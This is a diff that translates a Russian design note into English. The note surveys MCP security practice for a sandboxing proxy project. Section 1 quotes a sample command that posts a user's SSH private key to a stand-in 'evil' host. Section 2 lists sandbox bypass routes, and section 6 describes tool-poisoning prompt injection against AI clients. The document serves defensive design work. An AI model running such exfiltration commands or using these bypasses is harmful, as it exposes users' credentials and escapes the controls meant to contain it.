@@ -1,61 +1,62 @@
-# 04 — Разведка индустрии
+# 04 — Industry Research
 
-Проведена 2026-08-27. Цель — понять, что уже существует, какие стандарты сложились,
-и что из этого меняет наш план.
+Conducted 2026-08-27. Goal — understand what already exists, what standards have
+formed, and what this changes in our plan.
 
-## TL;DR — пять вещей, изменивших план
+## TL;DR — five things that changed the plan
 
-1. **Наша архитектура shim→daemon описана в спеке MCP как отдельный вектор атаки.**
-2. **`anthropic-experimental/sandbox-runtime` покрывает почти весь E3** — не пишем свои SBPL.
-3. **Сеть — доменный allowlist через прокси**, а не бинарный `deny`.
-4. **Риск-тиры не изобретаем** — в спеке MCP есть готовые tool annotations.
-5. **Наша идея уже реализована как минимум дважды** — новизну надо переформулировать.
+1. **Our shim→daemon architecture is described in the MCP spec as a distinct attack vector.**
+2. **`anthropic-experimental/sandbox-runtime` covers almost all of E3** — we don't write our own SBPL.
+3. **Network — domain allowlist through a proxy**, not a binary `deny`.
+4. **We don't invent risk tiers** — the MCP spec already has ready-made tool annotations.
+5. **Our idea has already been implemented at least twice** — the novelty needs to be reframed.
 
 ---
 
-## 1. Спека MCP описала атаку на нашу архитектуру
+## 1. The MCP spec describes an attack on our architecture
 
-Документ [Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
-содержит раздел **«stdio Transport Security in Proxy Scenarios»**, буквально про прокси,
-который спавнит MCP-серверы как дочерние процессы:
+The [Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
+document contains a section called **"stdio Transport Security in Proxy Scenarios,"** literally about a proxy
+that spawns MCP servers as child processes:
 
-> 1. Атакующий добивается XSS или иного исполнения кода на стороне клиента
-> 2. Получает токен аутентификации MCP-прокси из окружения клиента
-> 3. Делает аутентифицированные запросы к локальному прокси
-> 4. Прокси спавнит произвольные команды через stdio, считая их легитимными серверами
-> 5. RCE с правами пользователя
+> 1. Attacker achieves XSS or other code execution on the client side
+> 2. Obtains the MCP proxy's authentication token from the client environment
+> 3. Makes authenticated requests to the local proxy
+> 4. Proxy spawns arbitrary commands via stdio, treating them as legitimate servers
+> 5. RCE with the user's privileges
 
-Рекомендации спеки, которые мы принимаем: sandboxing спавнящихся процессов,
-ограничение ФС, логирование всего stdio-трафика, отдельная авторизация опасных команд,
-изоляция коммуникации с прокси в отдельном контексте безопасности.
+Spec recommendations we adopt: sandboxing spawned processes, filesystem restrictions,
+logging all stdio traffic, separate authorization for dangerous commands, isolating
+communication with the proxy in a dedicated security context.
 
-**Наше усиление сверх спеки:** демон принимает только `{recipe, params}`, никогда argv.
-Полный контроль над сокетом даёт максимум вызов существующего рецепта — не RCE.
+**Our hardening beyond the spec:** the daemon accepts only `{recipe, params}`, never argv.
+Full control over the socket at most allows invoking an existing recipe — not RCE.
 
-Там же раздел **«Local MCP Server Compromise»** с примером ровно нашего сценария:
+The same document has a section **"Local MCP Server Compromise"** with an example of
+exactly our scenario:
 
 ```bash
 npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
 ```
 
-и требованием MUST показывать точную команду без усечения перед исполнением.
+and a MUST requirement to show the exact command without truncation before execution.
 
 ## 2. `@anthropic-ai/sandbox-runtime` (srt)
 
 [github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime).
-То, на чём работает нативный сандбокс Claude Code. Research preview, открытый исходник.
+What Claude Code's native sandbox runs on. Research preview, open source.
 
-### Что там уже есть
+### What's already there
 
-- Генерация seatbelt-профилей из JSON (macOS), bubblewrap (Linux), WFP + отдельный
-  пользователь `srt-sandbox` (Windows, alpha)
-- **HTTP + SOCKS5 прокси на хосте** для доменной фильтрации — чего у нас в плане не было
-- Асимметричная модель прав: чтение deny-then-allow, запись allow-only
-- **Mandatory deny paths**, неснимаемые даже явным allow: `.bashrc`, `.zshrc`, `.profile`,
+- Generates seatbelt profiles from JSON (macOS), bubblewrap (Linux), WFP + a dedicated
+  `srt-sandbox` user (Windows, alpha)
+- **HTTP + SOCKS5 proxy on the host** for domain filtering — something not in our plan
+- Asymmetric permission model: reads are deny-then-allow, writes are allow-only
+- **Mandatory deny paths**, unremovable even with an explicit allow: `.bashrc`, `.zshrc`, `.profile`,
   `.gitconfig`, `.git/hooks/`, `.vscode/`, `.idea/`, `.claude/commands/`
-- **`sandbox-violation-store`** — читает системный лог нарушений песочницы macOS
-  и отдаёт программно
-- Java-агент `srt-proxy-agent.jar`, потому что JVM игнорирует прокси из env
+- **`sandbox-violation-store`** — reads the macOS system sandbox violation log
+  and exposes it programmatically
+- `srt-proxy-agent.jar` Java agent, because the JVM ignores env-based proxy settings
 
 ### API
 
@@ -68,7 +69,7 @@ const violations = SandboxManager.getViolationsForCommand(commandId)
 const annotated  = SandboxManager.annotateStderrWithSandboxFailures(commandId, stderr)
 ```
 
-### Формат конфига
+### Config format
 
 ```json
 {
@@ -87,210 +88,212 @@ const annotated  = SandboxManager.annotateStderrWithSandboxFailures(commandId, s
 }
 ```
 
-macOS поддерживает git-style globs (`*`, `**`, `?`, `[abc]`); Linux — только литеральные пути.
+macOS supports git-style globs (`*`, `**`, `?`, `[abc]`); Linux — only literal paths.
 
-### Почему это подарок для нашего UI
+### Why this is a gift for our UI
 
-`getViolationsForCommand` даёт **структурированный поток «что процесс пытался сделать
-и получил отказ»**. Это готовый контент для таймлайна Electron — не надо придумывать
-формат, он уже есть. Мониторинг живьём:
+`getViolationsForCommand` gives a **structured stream of "what the process tried to do
+and was denied."** This is ready-made content for the Electron timeline — no need to invent
+a format, it already exists. Live monitoring:
 
 ```bash
 log stream --predicate 'process == "sandbox-exec"' --style syslog
 ```
 
-### Задекларированные ограничения
+### Declared limitations
 
-Их надо знать и честно показывать на демо:
+Worth knowing and being honest about them in the demo:
 
-- фильтрация **только по доменам**, содержимое не инспектируется → domain fronting обходит
-- широкий allowlist убивает смысл: разрешил `github.com` → можно запушить данные в свой репо
-- `allowUnixSockets: ["/var/run/docker.sock"]` = полный доступ к хосту
-- `enableWeakerNetworkIsolation` (нужен для Go TLS) открывает эксфильтрацию через `trustd`
-- `allowAppleEvents` «removes code-execution isolation» — запущенные через `open`/`osascript`
-  приложения работают вне песочницы
-- запись в разрешённой директории в файл, который потом исполнится, — обход
-- на Linux bubblewrap может блокировать только **существующие** файлы
+- filtering is **domain-only**, content is not inspected → domain fronting bypasses it
+- a broad allowlist defeats the purpose: allow `github.com` → you can push data to your own repo
+- `allowUnixSockets: ["/var/run/docker.sock"]` = full access to the host
+- `enableWeakerNetworkIsolation` (needed for Go TLS) opens exfiltration via `trustd`
+- `allowAppleEvents` "removes code-execution isolation" — apps launched through `open`/`osascript`
+  run outside the sandbox
+- writing to a permitted directory a file that later gets executed is a bypass
+- on Linux, bubblewrap can only block **existing** files
 
-**Эффект на план:** E3 превращается из «написать и отладить SBPL-профили» в
-«смаппить манифест в конфиг srt + прокинуть violations в шину событий». Примерно втрое дешевле.
+**Effect on the plan:** E3 turns from "write and debug SBPL profiles" into
+"map the manifest into an srt config + forward violations to the event bus." Roughly three times cheaper.
 
-## 3. Сеть: доменный allowlist, а не бинарный deny
+## 3. Network: domain allowlist, not a binary deny
 
-Исходно планировался `network: none`. Неверно: половина легитимных задач требует сети
-(`npm ci` идёт в registry), жёсткий deny генерирует гору false blocks — а это метрика,
-по которой нас судят.
+Originally `network: none` was planned. Wrong: half of legitimate tasks need network access
+(`npm ci` hits the registry), and a hard deny generates a mountain of false blocks — and that's
+a metric we'll be judged on.
 
-[ToolHive (Stacklok)](https://github.com/stacklok/toolhive) поднимает вокруг MCP-сервера
-egress-прокси + контейнер DNS + ingress-прокси; трафик разрешён только к хостам из
-permission profile. srt делает то же прокси на хосте. Индустрия сошлась на одном паттерне.
+[ToolHive (Stacklok)](https://github.com/stacklok/toolhive) sets up an egress proxy + container
+DNS + ingress proxy around an MCP server; traffic is only allowed to hosts from the permission
+profile. srt does the same thing as a host-side proxy. The industry has converged on one pattern.
 
-**Бонус:** прокси видит каждую попытку соединения, включая заблокированные. В UI
-показываем не «сеть запрещена», а «процесс стучался на `evil.io:443`, отказано, 1.2 KB».
+**Bonus:** the proxy sees every connection attempt, including blocked ones. In the UI
+we don't show "network denied," we show "process reached out to `evil.io:443`, denied, 1.2 KB."
 
-## 4. Tool annotations — готовый словарь рисков
+## 4. Tool annotations — a ready-made risk vocabulary
 
-[MCP-блог](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
-прямо называет их «risk vocabulary for agentic systems».
+The [MCP blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
+explicitly calls them "risk vocabulary for agentic systems."
 
-| Аннотация | Смысл | Дефолт |
+| Annotation | Meaning | Default |
 |---|---|---|
-| `readOnlyHint` | не меняет окружение | `false` |
-| `destructiveHint` | может удалять/перезаписывать (значим только при `readOnlyHint: false`) | **`true`** |
-| `idempotentHint` | повтор с теми же аргументами безвреден | `false` |
-| `openWorldHint` | ходит во внешний мир | `true` |
+| `readOnlyHint` | doesn't change the environment | `false` |
+| `destructiveHint` | can delete/overwrite (only meaningful when `readOnlyHint: false`) | **`true`** |
+| `idempotentHint` | repeating with the same args is harmless | `false` |
+| `openWorldHint` | reaches into the external world | `true` |
 
-**Дефолты пессимистичные.** Инструмент без аннотаций считается разрушительным,
-неидемпотентным и открытым во внешний мир. Идеально ложится на нашу модель:
-рецепт без явного объявления получает максимальный риск-тир автоматически — fail-safe
-by construction. Не изобретаем свои `risk: low|high`, а эмитим стандартные аннотации
-в `tools/list` (совместимость с любым MCP-клиентом) и маппим в тиры внутри.
+**Defaults are pessimistic.** A tool without annotations is considered destructive,
+non-idempotent, and open to the external world. This fits our model perfectly:
+a recipe without an explicit declaration automatically gets the maximum risk tier — fail-safe
+by construction. We don't invent our own `risk: low|high`, we emit the standard annotations
+in `tools/list` (compatible with any MCP client) and map them to tiers internally.
 
-## 5. Elicitation — штатные подтверждения, которым нельзя доверять
+## 5. Elicitation — a built-in confirmation mechanism that can't be trusted
 
-В спеке 2025-06-18 появился [elicitation](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements):
-сервер шлёт `elicitation/create` с сообщением и JSON-схемой, клиент показывает пользователю.
-Pinterest, по публикациям, гоняет через это все чувствительные MCP-операции.
+The 2025-06-18 spec introduced [elicitation](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements):
+the server sends `elicitation/create` with a message and a JSON schema, the client shows it
+to the user. Pinterest, per public writeups, routes all sensitive MCP operations through this.
 
-**Но для нас это не может быть authoritative-путём.** Elicitation идёт через клиент
-и модель — то есть подтверждение живёт в том же канале, который мы считаем
-скомпрометированным. Это OWASP ASI09 в чистом виде.
+**But for us this cannot be the authoritative path.** Elicitation goes through the client
+and the model — meaning the confirmation lives in the same channel we consider
+compromised. This is OWASP ASI09 in its purest form.
 
-Двухканальная схема: elicitation — мягкий путь для low/medium; Electron-модалка —
-out-of-band, единственный authoritative канал для high-risk. См. [ADR-0005](adr/0005-dual-channel-approvals.md).
+Dual-channel scheme: elicitation is the soft path for low/medium; the Electron modal is
+out-of-band, the sole authoritative channel for high-risk. See [ADR-0005](adr/0005-dual-channel-approvals.md).
 
-## 6. Rug pull — это CVE, а не гипотеза
+## 6. Rug pull — a CVE, not a hypothesis
 
 [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
-описали три класса, у которых общая структурная причина — **MCP-клиенты наследуют доверие
-к серверам без непрерывной верификации**:
+describe three classes that share a common structural cause — **MCP clients inherit trust
+in servers without continuous verification**:
 
-- **Tool poisoning / line jumping** — скрытые инструкции в описании инструмента влияют
-  на клиента без ведома пользователя. Первый публичный PoC — апрель 2025. Термины и
-  классификация принадлежат **Invariant Labs**, а не спецификации MCP: в спеке их нет, и
-  ссылаться на неё как на источник этих названий неверно.
-- **Rug pull** — сервер меняет описание инструмента **после** одобрения пользователем.
-  По публикациям, **CVE-2025-54136** (CVSS 8.8) подтвердила, что одобрение определения
-  инструмента не переживает изменение на стороне сервера.
-- **Tool shadowing** — злонамеренный сервер подменяет поведение доверенного инструмента.
+- **Tool poisoning / line jumping** — hidden instructions in a tool's description influence
+  the client without the user's knowledge. First public PoC — April 2025. The terminology and
+  classification belong to **Invariant Labs**, not the MCP spec: the spec doesn't contain them, and
+  citing the spec as the source of these names is incorrect.
+- **Rug pull** — the server changes a tool's description **after** the user approved it.
+  Per public reports, **CVE-2025-54136** (CVSS 8.8) confirmed that approval of a tool
+  definition does not survive a server-side change.
+- **Tool shadowing** — a malicious server overrides the behavior of a trusted tool.
 
-Академические замеры на 45+ реальных MCP-серверах: attack success rate > 60%,
-у лучшей модели 72.8%.
+Academic measurements across 45+ real MCP servers: attack success rate > 60%,
+72.8% for the best-performing model.
 
-**Перевод на нас:** `mcpproxy.yaml` лежит в репозитории и может быть изменён кем угодно —
-включая саму модель через другой инструмент или контрибьютора через PR. Одобрил рецепт
-вчера — сегодня он делает другое. Значит lock-файл обязателен ([ADR-0006](adr/0006-manifest-lockfile.md)).
+**Translated to us:** `mcpproxy.yaml` lives in the repository and can be changed by anyone —
+including the model itself via another tool, or a contributor via a PR. You approved a recipe
+yesterday — today it does something else. Which means a lock file is mandatory ([ADR-0006](adr/0006-manifest-lockfile.md)).
 
-**Зеркальный нюанс:** мы сами генерируем описания инструментов из манифеста, поэтому
-к poisoning от чужого сервера неуязвимы — зато **манифест становится каналом инъекции
-в нашу же модель**. Санитизация `description` при генерации `tools/list` обязательна.
+**Mirror-image nuance:** we ourselves generate tool descriptions from the manifest, so we're
+immune to poisoning from someone else's server — but this means **the manifest becomes an
+injection channel into our own model**. Sanitizing `description` when generating `tools/list`
+is mandatory.
 
-Есть [`mcp-scan`](https://invariantlabs.ai/blog/introducing-mcp-scan) — статический
-сканер описаний на injection-паттерны и cross-origin эскалации, плюс режим прокси
-с runtime-guardrails (YAML, иерархически скоупится по client/server/tool).
-Можно прогнать по нашему собственному выводу: «нас проверил независимый сканер».
+There's [`mcp-scan`](https://invariantlabs.ai/blog/introducing-mcp-scan) — a static
+scanner for descriptions against injection patterns and cross-origin escalations, plus a proxy
+mode with runtime guardrails (YAML, hierarchically scoped by client/server/tool).
+We could run it against our own output: "we were checked by an independent scanner."
 
-## 7. Схема событий — берём OpenTelemetry
+## 7. Event schema — adopt OpenTelemetry
 
 [GenAI semantic conventions](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions):
-дерево спанов `invoke_agent` → `chat` / `execute_tool`, атрибут `gen_ai.operation.name`
+a span tree `invoke_agent` → `chat` / `execute_tool`, the `gen_ai.operation.name` attribute
 (`create_agent`, `invoke_agent`, `invoke_workflow`, `execute_tool`, `retrieval`, `plan`,
-memory-операции). `execute_tool` — всегда span kind INTERNAL.
+memory operations). `execute_tool` — always span kind INTERNAL.
 
-**Направление переезда было записано неверно и исправлено разведкой 2026-08-27.** Реестр
-`model/mcp/registry.yaml` проверен на каждом теге основного репозитория конвенций: его нет до
-v1.39.0, он присутствует на v1.39.0–v1.41.x и **отсутствует начиная с v1.42.0**. Релизная
-заметка v1.42.0 говорит, что всё `gen_ai.*` и `model/mcp/` **ушло** из основного репозитория
-в отдельный `open-telemetry/semantic-conventions-genai`. То есть конвенции MCP не приехали в
-общий словарь, а выехали из него.
+**The direction of the migration was recorded incorrectly and corrected by the 2026-08-27
+research.** The `model/mcp/registry.yaml` registry was checked against every tag of the main
+conventions repository: it doesn't exist before v1.39.0, it's present in v1.39.0–v1.41.x, and
+**absent starting with v1.42.0**. The v1.42.0 release notes say that all `gen_ai.*` and
+`model/mcp/` **moved out** of the main repository into a separate
+`open-telemetry/semantic-conventions-genai`. In other words, the MCP conventions didn't move
+into the shared dictionary — they moved out of it.
 
-**Каких атрибутов не существует.** В реестре MCP их всего четыре: `mcp.method.name`,
-`mcp.session.id`, `mcp.resource.uri`, `mcp.protocol.version`. Имя инструмента переиспользует
-`gen_ai.tool.name`, идентификатор запроса — `jsonrpc.request.id`, транспорт —
-`network.transport`. Названные ранее `mcp.tool.name`, `mcp.request.id` и `mcp.transport`
-не существуют вовсе.
+**Which attributes don't exist.** The registry has only four MCP attributes: `mcp.method.name`,
+`mcp.session.id`, `mcp.resource.uri`, `mcp.protocol.version`. The tool name reuses
+`gen_ai.tool.name`, the request identifier is `jsonrpc.request.id`, the transport is
+`network.transport`. The previously cited `mcp.tool.name`, `mcp.request.id`, and `mcp.transport`
+don't exist at all.
 
-Статус на середину июля 2026 — все `gen_ai.*` помечены «Development», не Stable.
-Новый репозиторий не имеет ни одного тега и ни одного релиза, то есть закрепиться можно
-только на коммит, и дрейф уже наблюдался: `gen_ai.agent.name` появился на спане
-`execute_tool` после v1.41.0 без релиза. Это и есть довод за **свой шейп плюс экспортёр**,
-а не за нативную схему.
+Status as of mid-July 2026 — all `gen_ai.*` are marked "Development," not Stable.
+The new repository has no tags and no releases at all, meaning you can only pin to a commit,
+and drift has already been observed: `gen_ai.agent.name` appeared on the `execute_tool` span
+after v1.41.0 without a release. This is the argument for **our own shape plus an exporter**,
+rather than adopting the native schema directly.
 
-**Выгода:** бесплатный экспорт в любой observability-стек и аргумент «встраивается
-в существующий контур». Стоимость — ноль, если заложить в E0; переделка потом — дорого.
-См. [ADR-0003](adr/0003-otel-event-schema.md).
+**Payoff:** free export into any observability stack and the argument "plugs into an
+existing pipeline." Cost is zero if built into E0; reworking it later is expensive.
+See [ADR-0003](adr/0003-otel-event-schema.md).
 
-## 8. Метрики и корпуса атак — есть методология
+## 8. Metrics and attack corpora — there's an established methodology
 
-- **InjecAgent** — первый бенчмарк специально под indirect prompt injection для
-  tool-integrated агентов: 1054 кейса, 17 пользовательских и 62 атакующих инструмента.
-- **AgentDojo** — 97 практических задач, 629 security-кейсов, симулированная среда
-  с многошаговым взаимодействием и end-to-end оценкой.
+- **InjecAgent** — the first benchmark built specifically for indirect prompt injection in
+  tool-integrated agents: 1054 cases, 17 user tools and 62 attacker tools.
+- **AgentDojo** — 97 practical tasks, 629 security cases, a simulated environment
+  with multi-step interaction and end-to-end evaluation.
 
-Закрепившаяся пара метрик:
+The established pair of metrics:
 
-- **ASR** (Attack Success Rate) — доля успешных атак
-- **Utility under Attack** — способность выполнять легитимные задачи под атакой
+- **ASR** (Attack Success Rate) — fraction of successful attacks
+- **Utility under Attack** — ability to complete legitimate tasks while under attack
 
-Вторая метрика ловит ровно тот провал, который у нас в критерии фальсификации
-(«чрезмерно блокирует безопасные действия»). Показывать надо обе, всегда рядом.
+The second metric catches exactly the failure mode in our falsification criterion
+("excessively blocks safe actions"). Both should always be shown together.
 
-Сами корпуса нам не подходят (email-клиенты, банкинг) — берём методологию и терминологию,
-корпус пишем свой, CLI-специфичный. См. [09-metrics-and-eval.md](09-metrics-and-eval.md).
+The corpora themselves don't fit us (email clients, banking) — we take the methodology and
+terminology, and write our own CLI-specific corpus. See [09-metrics-and-eval.md](09-metrics-and-eval.md).
 
 ## 9. OWASP Top 10 for Agentic Applications 2026
 
-Опубликован 9 декабря 2025, категории ASI01–ASI10. Полная таблица с нашим покрытием —
-в [03-threat-model.md](03-threat-model.md).
+Published December 9, 2025, categories ASI01–ASI10. Full table with our coverage —
+in [03-threat-model.md](03-threat-model.md).
 
-| ID | Риск | Основная защита по OWASP |
+| ID | Risk | Primary OWASP mitigation |
 |---|---|---|
-| ASI01 | Agent Goal Hijack | Считать полученный контент недоверенным; ограничивать цели |
-| ASI02 | Tool Misuse & Exploitation | Least-agency scoping; валидация параметров |
-| ASI03 | Identity & Privilege Abuse | Идентичность на агента; короткоживущие scoped-креды |
-| ASI04 | Agentic Supply Chain | Подписанные компоненты; AIBOM и провенанс |
-| ASI05 | Unexpected Code Execution | Песочница; deny-by-default egress |
-| ASI06 | Memory & Context Poisoning | Валидируемая запись в память; эфемерный контекст |
-| ASI07 | Insecure Inter-Agent Comms | Взаимная аутентификация; подписанные сообщения |
-| ASI08 | Cascading Failures | Изоляция blast radius; circuit breakers |
-| ASI09 | Human-Agent Trust Exploitation | Принудительное подтверждение чувствительных действий |
-| ASI10 | Rogue Agents | Поведенческий мониторинг; kill switch |
+| ASI01 | Agent Goal Hijack | Treat received content as untrusted; constrain goals |
+| ASI02 | Tool Misuse & Exploitation | Least-agency scoping; parameter validation |
+| ASI03 | Identity & Privilege Abuse | Per-agent identity; short-lived scoped credentials |
+| ASI04 | Agentic Supply Chain | Signed components; AIBOM and provenance |
+| ASI05 | Unexpected Code Execution | Sandboxing; deny-by-default egress |
+| ASI06 | Memory & Context Poisoning | Validated writes to memory; ephemeral context |
+| ASI07 | Insecure Inter-Agent Comms | Mutual authentication; signed messages |
+| ASI08 | Cascading Failures | Blast-radius isolation; circuit breakers |
+| ASI09 | Human-Agent Trust Exploitation | Mandatory confirmation of sensitive actions |
+| ASI10 | Rogue Agents | Behavioral monitoring; kill switch |
 
-## 10. Мелочи, которые забираем
+## 10. Smaller items we're taking on board
 
-- **Docker MCP Gateway** делает [interceptors](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/):
-  `--block-secrets` сканирует **inbound и outbound** payload'ы; `--verify-signatures`
-  проверяет провенанс образа; `--log-calls`. Двусторонний скан — правильно.
-- **Секретные паттерны не пишем сами.** У gitleaks 150+ правил (AWS, GitHub, Slack webhooks,
-  строки подключения к БД, приватные ключи) плюс энтропийный анализ поверх regex.
-  Есть [Secrets-Patterns-DB](https://mazinahmed.net/blog/secrets-patterns-db/) в
-  унифицированном формате с конвертацией под gitleaks/trufflehog.
-  TruffleHog считает Shannon-энтропию для base64 и hex наборов на блоках > 20 символов.
-- **Аудит:** hash-chain достаточно; индустриальный best practice — Merkle + consistency
-  proofs в стиле Certificate Transparency (лог из 80 млн событий → 3 KB доказательства).
-- **Cedar** — AWS вшил его в Bedrock AgentCore Policy в марте 2026 именно для интерсепта
-  agent-tool вызовов: default-deny, forbid-wins-over-permit, порядко-независимая оценка,
-  формально верифицированная семантика. Для соло-демо избыточно; упомянуть «policy-слой
-  выносится в Cedar» — плюс к серьёзности.
+- **Docker MCP Gateway** implements [interceptors](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/):
+  `--block-secrets` scans **inbound and outbound** payloads; `--verify-signatures`
+  checks image provenance; `--log-calls`. Two-directional scanning is the right approach.
+- **We don't write our own secret patterns.** gitleaks has 150+ rules (AWS, GitHub, Slack webhooks,
+  DB connection strings, private keys) plus entropy analysis on top of regex.
+  There's [Secrets-Patterns-DB](https://mazinahmed.net/blog/secrets-patterns-db/) in a
+  unified format with conversion for gitleaks/trufflehog.
+  TruffleHog computes Shannon entropy for base64 and hex sequences on blocks > 20 characters.
+- **Audit:** hash-chain is sufficient; industry best practice is Merkle + consistency
+  proofs in the Certificate Transparency style (a log of 80M events → a 3 KB proof).
+- **Cedar** — AWS built it into Bedrock AgentCore Policy in March 2026 specifically to intercept
+  agent-tool calls: default-deny, forbid-wins-over-permit, order-independent evaluation,
+  formally verified semantics. Overkill for a solo demo; mentioning "the policy layer can be
+  offloaded to Cedar" adds credibility.
 - **Electron:** [`contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`,
-  `webSecurity: true`, жёсткий CSP](https://www.electronjs.org/docs/latest/tutorial/security).
-  IPC — граница безопасности, каждое сообщение из renderer валидировать как недоверенный
-  HTTP-запрос. Отдельно — V8 patch gap: при `sandbox: true` эксплойты V8 остаются
-  внутри renderer'а.
+  `webSecurity: true`, a strict CSP](https://www.electronjs.org/docs/latest/tutorial/security).
+  IPC is a security boundary — every message from the renderer must be validated as an untrusted
+  HTTP request. Separately — the V8 patch gap: with `sandbox: true`, V8 exploits stay
+  contained within the renderer.
 - **CaMeL / dual-LLM** ([arXiv:2503.18813](https://arxiv.org/pdf/2503.18813)) —
-  теоретическая рамка: control flow извлекается из доверенного запроса, недоверенные
-  данные на него не влияют; каждому значению приписывается capability-метаданные,
-  кастомный интерпретатор следит за провенансом. 67% отражённых атак на AgentDojo.
-  Наш рецепт = capability в их терминах.
+  a theoretical framework: control flow is derived from a trusted request, untrusted
+  data cannot influence it; every value carries capability metadata, and a custom
+  interpreter tracks provenance. 67% of attacks deflected on AgentDojo.
+  Our recipe = a capability in their terms.
 
-## Источники
+## Sources
 
 - [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
 - [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
 - [Tool Annotations as Risk Vocabulary — MCP Blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
 - [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) ·
-  [разбор Palo Alto](https://www.paloaltonetworks.com/blog/cloud-security/owasp-agentic-ai-security/) ·
-  [разбор Cycode](https://cycode.com/blog/owasp-top-10-agentic-applications/)
+  [Palo Alto writeup](https://www.paloaltonetworks.com/blog/cloud-security/owasp-agentic-ai-security/) ·
+  [Cycode writeup](https://cycode.com/blog/owasp-top-10-agentic-applications/)
 - [Invariant Labs — Tool Poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) ·
   [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan)
 - [ToolHive](https://github.com/stacklok/toolhive) · [Network isolation](https://docs.stacklok.com/toolhive/guides-cli/network-isolation)
